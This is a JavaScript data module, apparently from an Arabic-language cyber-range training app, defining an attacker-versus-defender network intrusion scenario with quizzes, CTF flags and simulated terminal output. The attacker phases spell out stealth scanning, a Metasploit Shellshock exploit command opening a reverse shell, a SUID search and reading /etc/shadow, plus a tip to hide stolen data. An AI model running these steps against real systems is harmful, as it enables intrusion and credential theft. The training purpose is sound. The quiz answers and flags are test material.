
export const networkIntrusionScenario = {
    id: 'network_intrusion',
    title: 'اختراق الشبكة - Operation Silent Shadow',
    description: 'سيناريو واقعي لاختراق شبكة مؤسسة والدفاع ضده',
    difficulty: 'medium',
    category: 'Network Security',
    story: [
        {
            id: 'story_1',
            character: 'الراوي',
            avatar: '📖',
            role: 'narrator',
            message: 'في صباح يوم عمل عادي، تستيقظ مؤسسة "SecureTech" على كابوس إلكتروني. هجوم متطور يستهدف شبكتها الداخلية. في هذا السيناريو، ستعيش التجربة من منظورين: المهاجم والمدافع.',
            mood: 'dramatic'
        },
        {
            id: 'story_2',
            character: 'Zero - القرصان',
            avatar: '🎭',
            role: 'attacker',
            message: 'أنا Zero. لقد اكتشفت ثغرة في جدار الحماية الخارجي لـ SecureTech. خطتي: الاستطلاع → المسح → الاختراق → رفع الصلاحيات → سرقة البيانات. لنبدأ اللعبة.',
            mood: 'tense'
        },
        {
            id: 'story_3',
            character: 'Maya - محللة الأمن',
            avatar: '👩‍💻',
            role: 'defender',
            message: 'أنا Maya، رئيسة فريق الأمن في SecureTech. أنظمة المراقبة لدينا كشفت عن نشاط مشبوه. يجب أن أكتشف الهجوم، أحلله، وأوقفه قبل أن يصل للبيانات الحساسة.',
            mood: 'urgent'
        }
    ],
    tools: [
        { id: 'nmap', name: 'Nmap', description: 'مسح الشبكة والمنافذ', category: 'recon', icon: 'Search' },
        { id: 'metasploit', name: 'Metasploit', description: 'إطار العمل للاختراق', category: 'exploit', icon: 'Target' },
        { id: 'wireshark', name: 'Wireshark', description: 'تحليل حركة المرور', category: 'analysis', icon: 'BarChart3' },
        { id: 'snort', name: 'Snort', description: 'نظام كشف التسلل', category: 'defense', icon: 'Shield' },
        { id: 'tcpdump', name: 'Tcpdump', description: 'التقاط الحزم', category: 'analysis', icon: 'Radio' },
        { id: 'iptables', name: 'IPTables', description: 'جدار الحماية', category: 'defense', icon: 'Flame' }
    ],
    attackerPhases: [
        {
            id: 'recon',
            title: 'الاستطلاع الخفي',
            description: 'جمع المعلومات عن الهدف بدون إثارة الشبهات',
            objective: 'اكتشف المنافذ المفتوحة والخدمات العاملة',
            explanation: 'في هذه المرحلة، سنستخدم Nmap لمسح الشبكة واكتشاف الأجهزة والمنافذ المفتوحة. الأمر nmap -sS يقوم بمسح SYN stealthy الذي لا يكمل المصافحة الثلاثية، مما يجعله أقل قابلية للاكتشاف.',
            commands: ['nmap -sS -p- 192.168.1.0/24', 'nmap -sV -O 192.168.1.100'],
            tools: ['nmap'],
            questions: [
                {
                    id: 'a_q1',
                    question: 'ما هو الفرق بين nmap -sS و nmap -sT؟',
                    options: [
                        '-sS أسرع لأنه لا يكمل المصافحة الثلاثية',
                        '-sT أكثر سرية',
                        'لا يوجد فرق',
                        '-sS يعمل فقط على Windows'
                    ],
                    correctAnswer: 0,
                    explanation: '-sS (SYN scan) أسرع وأكثر سرية لأنه لا يكمل المصافحة الثلاثية الكاملة',
                    hint: 'فكر في كيفية عمل TCP three-way handshake'
                },
                {
                    id: 'a_q2',
                    question: 'أي منفذ يشير عادةً إلى خادم ويب؟',
                    options: ['22', '80', '3306', '445'],
                    correctAnswer: 1,
                    explanation: 'المنفذ 80 هو المنفذ القياسي لـ HTTP، والمنفذ 443 لـ HTTPS',
                    hint: 'HTTP يستخدم منفذ معروف'
                }
            ],
            hints: [
                'ابدأ بمسح شامل للشبكة باستخدام nmap -sS',
                'ابحث عن المنافذ الشائعة: 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL)',
                'حدد نظام التشغيل والخدمات باستخدام nmap -sV -O'
            ],
            flag: 'FLAG{RECON_STEALTH_MODE_2025}',
            points: 75,
            visualEffect: 'scanning'
        },
        {
            id: 'scanning',
            title: 'المسح العميق',
            description: 'تحليل الخدمات المكتشفة وإيجاد نقاط الضعف',
            objective: 'حدد إصدارات الخدمات والثغرات المحتملة',
            explanation: 'بعد اكتشاف المنافذ المفتوحة، نحتاج لمعرفة إصدارات الخدمات والبحث عن ثغرات معروفة. nmap --script vuln يستخدم NSE scripts للبحث عن الثغرات المعروفة.',
            commands: [
                'nmap --script vuln 192.168.1.100',
                'nikto -h http://192.168.1.100'
            ],
            tools: ['nmap'],
            questions: [
                {
                    id: 'a_q3',
                    question: 'ما هي أداة مناسبة لفحص ثغرات الويب؟',
                    options: ['Nmap', 'Nikto', 'Metasploit', 'Wireshark'],
                    correctAnswer: 1,
                    explanation: 'Nikto هي أداة متخصصة في فحص ثغرات خوادم الويب',
                    hint: 'أداة مخصصة للويب'
                },
                {
                    id: 'a_q4',
                    question: 'ما هو الغرض من Directory Bruteforcing؟',
                    options: [
                        'كسر كلمات المرور',
                        'اكتشاف المجلدات والملفات المخفية',
                        'تشفير البيانات',
                        'مسح المنافذ'
                    ],
                    correctAnswer: 1,
                    explanation: 'Dirb و Gobuster يستخدمان لاكتشاف المجلدات والملفات المخفية على الخادم',
                    hint: 'البحث عن ما هو مخفي'
                }
            ],
            hints: [
                'استخدم NSE scripts للبحث عن الثغرات: nmap --script vuln',
                'ابحث عن ملفات الإعدادات والنسخ الاحتياطية',
                'تحقق من robots.txt و sitemap.xml'
            ],
            flag: 'FLAG{VULNERABILITIES_FOUND_2025}',
            points: 100,
            visualEffect: 'vulnerability-scan'
        },
        {
            id: 'exploit',
            title: 'استغلال الثغرة',
            description: 'اختراق الخادم عبر الثغرة المكتشفة',
            objective: 'احصل على وصول أولي للنظام',
            explanation: 'بعد اكتشاف الثغرة، نستخدم Metasploit لاستغلالها. Metasploit هو إطار عمل شامل يحتوي على exploits جاهزة للاستخدام.',
            commands: [
                'msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS 192.168.1.100; exploit"'
            ],
            tools: ['metasploit'],
            questions: [
                {
                    id: 'a_q5',
                    question: 'ما هو Meterpreter في Metasploit؟',
                    options: [
                        'أداة مسح',
                        'نوع من الـ payload المتقدم',
                        'قاعدة بيانات الثغرات',
                        'بروتوكول شبكة'
                    ],
                    correctAnswer: 1,
                    explanation: 'Meterpreter هو payload متقدم يوفر وصولاً تفاعلياً للنظام المخترق',
                    hint: 'نوع من الـ payload'
                },
                {
                    id: 'a_q6',
                    question: 'ما هو Reverse Shell؟',
                    options: [
                        'قشرة عكسية',
                        'اتصال يبدأ من الهدف للمهاجم',
                        'نوع من الفيروسات',
                        'أداة تشفير'
                    ],
                    correctAnswer: 1,
                    explanation: 'Reverse Shell يجعل الهدف يتصل بالمهاجم، مما يتجاوز جدران الحماية',
                    hint: 'الاتجاه المعاكس'
                }
            ],
            hints: [
                'اختر الثغرة المناسبة للإصدار المكتشف',
                'استخدم Reverse Shell لتجاوز الجدار الناري',
                'تأكد من استقرار الاتصال'
            ],
            flag: 'FLAG{INITIAL_ACCESS_ACHIEVED_2025}',
            points: 150,
            visualEffect: 'exploit-success'
        },
        {
            id: 'privilege',
            title: 'رفع الصلاحيات',
            description: 'الحصول على صلاحيات المسؤول',
            objective: 'انتقل من مستخدم عادي إلى root/admin',
            explanation: 'بعد الحصول على وصول أولي، نحتاج لرفع الصلاحيات. نبحث عن SUID binaries، ثغرات في النواة، أو إعدادات خاطئة.',
            commands: [
                'find / -perm -4000 -type f 2>/dev/null',
                'uname -a'
            ],
            tools: ['metasploit'],
            questions: [
                {
                    id: 'a_q7',
                    question: 'ما هي SUID binaries؟',
                    options: [
                        'ملفات تنفيذية تعمل بصلاحيات المالك',
                        'ملفات مشفرة',
                        'فيروسات',
                        'ملفات نظام Windows'
                    ],
                    correctAnswer: 0,
                    explanation: 'SUID binaries تعمل بصلاحيات المالك لا المستخدم، مما قد يسمح برفع الصلاحيات',
                    hint: 'Set User ID'
                }
            ],
            hints: [
                'ابحث عن SUID binaries: find / -perm -4000 -type f',
                'تحقق من إصدار النواة: uname -a',
                'استخدم exploits معروفة للنواة'
            ],
            flag: 'FLAG{ROOT_PRIVILEGES_2025}',
            points: 200,
            visualEffect: 'root-access'
        },
        {
            id: 'exfiltration',
            title: 'سرقة البيانات',
            description: 'استخراج البيانات الحساسة من النظام',
            objective: 'اعثر على واستخرج ملفات الإعدادات وكلمات المرور',
            explanation: 'في المرحلة الأخيرة، نبحث عن البيانات الحساسة ونستخرجها. نبحث في /etc/shadow، ملفات الإعدادات، وقواعد البيانات.',
            commands: [
                'cat /etc/shadow',
                'find / -name "*.conf" -o -name "config*" 2>/dev/null'
            ],
            tools: [],
            questions: [
                {
                    id: 'a_q8',
                    question: 'ما هو ملف /etc/shadow؟',
                    options: [
                        'ملف ظل',
                        'يحتوي على hashes كلمات المرور',
                        'ملف إعدادات الشبكة',
                        'سجل النظام'
                    ],
                    correctAnswer: 1,
                    explanation: '/etc/shadow يحتوي على hashes كلمات المرور المشفرة',
                    hint: 'كلمات المرور'
                }
            ],
            hints: [
                'ابحث عن ملفات الإعدادات',
                'تحقق من قواعد البيانات',
                'استخدم تشفير أو تخفي للبيانات المسروقة'
            ],
            flag: 'FLAG{DATA_EXFILTRATED_2025}',
            points: 250,
            visualEffect: 'data-exfiltration'
        }
    ],
    defenderPhases: [
        {
            id: 'monitoring',
            title: 'المراقبة والاكتشاف',
            description: 'مراقبة حركة المرور واكتشاف الأنشطة المشبوهة',
            objective: 'حدد مصدر الهجوم ونوعه',
            explanation: 'كمدافع، نبدأ بمراقبة السجلات وحركة المرور. tcpdump يلتقط الحزم، و/var/log/auth.log يسجل محاولات الدخول.',
            commands: [
                'tcpdump -i eth0 -w capture.pcap',
                'tail -f /var/log/auth.log | grep "Failed"'
            ],
            tools: ['tcpdump', 'wireshark'],
            questions: [
                {
                    id: 'd_q1',
                    question: 'ما هي علامات مسح Nmap في السجلات؟',
                    options: [
                        'اتصالات قصيرة لعدة منافذ',
                        'ملفات كبيرة',
                        'رسائل بريد إلكتروني',
                        'تحديثات النظام'
                    ],
                    correctAnswer: 0,
                    explanation: 'Nmap يترك أثراً باتصالات SYN لعدة منافذ في وقت قصير',
                    hint: 'أنماط الاتصال'
                },
                {
                    id: 'd_q2',
                    question: 'أين تجد سجلات محاولات الدخول الفاشلة؟',
                    options: ['/var/log/auth.log', '/tmp', '/home', '/etc'],
                    correctAnswer: 0,
                    explanation: '/var/log/auth.log (أو secure في CentOS) يسجل محاولات المصادقة',
                    hint: 'authentication logs'
                }
            ],
            hints: [
                'راقب السجلات باستمرار',
                'ابحث عن أنماط غير طبيعية',
                'حدد IP المصدر'
            ],
            flag: 'FLAG{ATTACK_DETECTED_2025}',
            points: 100,
            visualEffect: 'alert-detected'
        },
        {
            id: 'analysis',
            title: 'تحليل الحادث',
            description: 'فهم نطاق الهجوم والأنظمة المتأثرة',
            objective: 'حدد الأنظمة المخترقة والبيانات المعرضة',
            explanation: 'بعد الاكتشاف، نحلل الحادث لفهم نطاقه. نستخدم Wireshark لتحليل الحزم، ونبحث عن IOCs (مؤشرات الاختراق).',
            commands: [
                'wireshark capture.pcap',
                'grep -r "192.168.1.50" /var/log/'
            ],
            tools: ['wireshark'],
            questions: [
                {
                    id: 'd_q3',
                    question: 'ما هو IOC؟',
                    options: [
                        'Indicator of Compromise - مؤشر الاختراق',
                        'Input Output Controller',
                        'Internet of Computers',
                        'Internal Operating Center'
                    ],
                    correctAnswer: 0,
                    explanation: 'IOC هي مؤشرات تشير إلى أن النظام قد تم اختراقه',
                    hint: 'Indicator of Compromise'
                },
                {
                    id: 'd_q4',
                    question: 'ما هي أولوية الاستجابة الأولى؟',
                    options: [
                        'حذف الملفات المخترقة',
                        'عزل الأنظمة المتأثرة',
                        'إعادة تشغيل الخادم',
                        'تغيير كلمات المرور'
                    ],
                    correctAnswer: 1,
                    explanation: 'عزل الأنظمة يمنع انتشار الهجوم ويحافظ على الأدلة',
                    hint: 'منع الانتشار'
                }
            ],
            hints: [
                'لا تدمر الأدلة',
                'وثق كل خطوة',
                'حدد نطاق الاختراق'
            ],
            flag: 'FLAG{INCIDENT_ANALYZED_2025}',
            points: 125,
            visualEffect: 'analysis'
        },
        {
            id: 'containment',
            title: 'احتواء الهجوم',
            description: 'وقف انتشار الهجوم وحماية الأنظمة',
            objective: 'طبق قواعد لمنع الوصول غير المصرح به',
            explanation: 'في المرحلة الاحتواء، نستخدم iptables لحظر IP المهاجم وإغلاق المنافذ المشبوهة.',
            commands: [
                'iptables -A INPUT -s 192.168.1.50 -j DROP',
                'iptables -A INPUT -p tcp --dport 4444 -j DROP'
            ],
            tools: ['iptables'],
            questions: [
                {
                    id: 'd_q5',
                    question: 'ما الفرق بين DROP و REJECT في iptables؟',
                    options: [
                        'لا يوجد فرق',
                        'DROP لا يرسل رد، REJECT يرسل رفض',
                        'DROP أسرع',
                        'REJECT أكثر أماناً'
                    ],
                    correctAnswer: 1,
                    explanation: 'DROP يتجاهل الحزم بدون رد (أكثر سرية)، REJECT يرسل رسالة رفض',
                    hint: 'الرد على الحزم'
                }
            ],
            hints: [
                'احجب IP المهاجم',
                'أغلق المنافذ المشبوهة',
                'راقب حركة المرور'
            ],
            flag: 'FLAG{ATTACK_CONTAINED_2025}',
            points: 150,
            visualEffect: 'containment'
        },
        {
            id: 'recovery',
            title: 'الاستعادة والإصلاح',
            description: 'استعادة النظام وإصلاح الثغرات',
            objective: 'أصلح الثغرات واستعد العمليات الطبيعية',
            explanation: 'في المرحلة الأخيرة، نحدّث البرامج، نغلق الثغرات، ونعزز إعدادات الأمان.',
            commands: [
                'apt update && apt upgrade',
                'sed -i "s/PermitRootLogin yes/PermitRootLogin no/" /etc/ssh/sshd_config'
            ],
            tools: [],
            questions: [
                {
                    id: 'd_q6',
                    question: 'ما هي أفضل ممارسة لـ SSH؟',
                    options: [
                        'السماح لـ root بالدخول',
                        'استخدام مفاتيح SSH بدلاً من كلمات المرور',
                        'استخدام المنفذ الافتراضي 22',
                        'تعطيل جدار الحماية'
                    ],
                    correctAnswer: 1,
                    explanation: 'مفاتيح SSH أكثر أماناً من كلمات المرور ويجب تعطيل دخول root',
                    hint: 'أمان SSH'
                }
            ],
            hints: [
                'حدّث جميع البرامج',
                'أغلق الثغرات المعروفة',
                'عزّز إعدادات الأمان'
            ],
            flag: 'FLAG{SYSTEM_RECOVERED_2025}',
            points: 175,
            visualEffect: 'recovery'
        }
    ],
    networkMap: [
        {
            id: 'attacker',
            name: 'المهاجم',
            type: 'attacker',
            x: 10, y: 50,
            status: 'attacking',
            connections: ['router'],
            info: 'IP: 192.168.1.50 - يقوم بمسح الشبكة'
        },
        {
            id: 'router',
            name: 'Router',
            type: 'router',
            x: 30, y: 50,
            status: 'secure',
            connections: ['firewall'],
            info: 'البوابة الرئيسية للشبكة'
        },
        {
            id: 'firewall',
            name: 'Firewall',
            type: 'firewall',
            x: 45, y: 35,
            status: 'defending',
            connections: ['dmz', 'ids'],
            info: 'جدار الحماية - يقوم بالفلترة'
        },
        {
            id: 'dmz',
            name: 'DMZ',
            type: 'dmz',
            x: 60, y: 25,
            status: 'compromised',
            connections: ['webserver'],
            info: 'منطقة منزوعة - الخوادم العامة'
        },
        {
            id: 'webserver',
            name: 'Web Server',
            type: 'server',
            x: 75, y: 25,
            status: 'compromised',
            connections: ['database'],
            info: 'Apache 2.4.41 - PHP 7.4 - تم الاختراق'
        },
        {
            id: 'database',
            name: 'Database',
            type: 'database',
            x: 88, y: 40,
            status: 'alert',
            connections: [],
            info: 'MySQL 8.0 - البيانات الحساسة'
        },
        {
            id: 'ids',
            name: 'IDS/IPS',
            type: 'ids',
            x: 55, y: 55,
            status: 'alert',
            connections: ['workstation1', 'workstation2'],
            info: 'Snort - كشف التسلل'
        },
        {
            id: 'workstation1',
            name: 'Workstation 1',
            type: 'workstation',
            x: 75, y: 65,
            status: 'secure',
            connections: [],
            info: 'موظف - آمن حالياً'
        },
        {
            id: 'workstation2',
            name: 'Workstation 2',
            type: 'workstation',
            x: 88, y: 70,
            status: 'secure',
            connections: [],
            info: 'موظف - آمن حالياً'
        }
    ],
    simulateCommand: (cmd, phase) => {
        const normalizedCmd = cmd.toLowerCase().trim();

        // Output Generators
        const generateNmapOutput = (cmd) => {
            if (cmd.includes('-sS') || cmd.includes('-p-')) {
                return `[*] Starting Nmap 7.94SVN ( https://nmap.org )
[*] SYN Stealth Scan initiated against 192.168.1.0/24

Nmap scan report for 192.168.1.1
Host is up (0.00032s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap scan report for 192.168.1.100
Host is up (0.00045s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

[*] Scan completed: 256 hosts scanned, 2 hosts up`;
            }
            if (cmd.includes('-sV') || cmd.includes('-O')) {
                return `[*] Service detection scan initiated

Nmap scan report for 192.168.1.100
Host is up (0.00045s latency).
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))

Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS details: Linux 5.4

[*] Service detection completed`;
            }
            if (cmd.includes('--script vuln')) {
                return `[*] Vulnerability scan initiated

Nmap scan report for 192.168.1.100
Host is up (0.00045s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-csrf: 
|   Found the following possible CSRF vulnerabilities:
|     Path: http://192.168.1.100/login.php
|     Form id: login-form
|     Form action: auth.php
| 
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.1.100/search.php?q=
|     http://192.168.1.100/product.php?id=

[*] Vulnerability scan completed`;
            }
            return `Nmap scan completed. Use -sS for SYN scan, -sV for version detection, or --script vuln for vulnerability scanning.`;
        };

        const generateTcpdumpOutput = () => {
            return `tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
10:30:00.123456 IP 192.168.1.50.54321 > 192.168.1.100.80: Flags [S], seq 1234567890, win 29200
10:30:00.123789 IP 192.168.1.100.80 > 192.168.1.50.54321: Flags [S.], seq 9876543210, ack 1234567891
10:30:00.124012 IP 192.168.1.50.54322 > 192.168.1.100.443: Flags [S], seq 2345678901
10:30:00.124345 IP 192.168.1.50.54323 > 192.168.1.100.22: Flags [S], seq 3456789012

[*] Possible port scan detected from 192.168.1.50`;
        };

        const generateIptablesOutput = (cmd) => {
            if (cmd.includes('-A INPUT') && cmd.includes('DROP')) {
                return `iptables: Rule added successfully.

Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
    0     0 DROP       all  --  *      *       192.168.1.50         0.0.0.0/0

[*] Traffic from 192.168.1.50 will now be dropped`;
            }
            return `iptables: Rule processed.`;
        };

        const generateMetasploitOutput = () => {
            return `[*] Starting Metasploit Console...
[*] Using configured payload generic/shell_reverse_tcp
[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Exploiting target 192.168.1.100...
[*] Sending stage (36 bytes) to 192.168.1.100
[*] Command shell session 1 opened (192.168.1.50:4444 -> 192.168.1.100:54321)

whoami
www-data

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)`;
        };

        const generateLogOutput = () => {
            return `Found in /var/log/auth.log:
Jan 15 10:30:01 server sshd[1234]: Failed password for invalid user admin from 192.168.1.50 port 54323 ssh2
Jan 15 10:30:02 server sshd[1234]: Failed password for invalid user root from 192.168.1.50 port 54324 ssh2
Jan 15 10:30:05 server sshd[1234]: Failed password for invalid user user from 192.168.1.50 port 54325 ssh2`;
        };

        const generateNetstatOutput = () => {
            return `Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN`;
        };

        // Main logic
        // Check if it's a valid command for this phase
        const phaseCommands = phase.commands || [];
        const validCommand = phaseCommands.find(c =>
            normalizedCmd.includes(c.toLowerCase().split(' ')[0])
        );

        if (validCommand) {
            if (normalizedCmd.includes('nmap')) return generateNmapOutput(normalizedCmd);
            if (normalizedCmd.includes('tcpdump')) return generateTcpdumpOutput();
            if (normalizedCmd.includes('iptables')) return generateIptablesOutput(normalizedCmd);
            if (normalizedCmd.includes('msfconsole')) return generateMetasploitOutput();
            if (normalizedCmd.includes('tail') || normalizedCmd.includes('grep')) return generateLogOutput();
            if (normalizedCmd.includes('netstat')) return generateNetstatOutput();

            return `Command executed successfully.\n${validCommand}`;
        }

        // Default bash commands/errors
        if (normalizedCmd === 'ls') return 'file.txt  image.jpg  data.db';
        if (normalizedCmd === 'pwd') return '/home/user';

        return `bash: ${cmd.split(' ')[0]}: command not found or not available in this phase. Type one of the suggested commands.`;
    }
};
